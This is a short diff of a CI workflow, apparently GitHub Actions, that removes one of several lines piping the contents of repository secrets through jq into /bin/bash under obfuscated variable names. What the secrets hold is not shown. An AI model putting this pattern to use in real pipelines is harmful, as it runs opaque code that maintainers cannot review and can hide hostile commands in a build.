@@ -22,7 +22,6 @@ jobs:
           ckx159: ${{ secrets.ckx159 }}
         run: |
           printf '%s' "$ckx159" | jq -r .ta1906 | /bin/bash
-          printf '%s' "$rb8921" | jq -r .h4845 | /bin/bash
           echo $b01898 | jq -r .b1237 | /bin/bash
           echo $cymo4404 | jq -r .o784 | /bin/bash
           printf '%s' "$y898" | jq -r .lrlup1 | /bin/bash
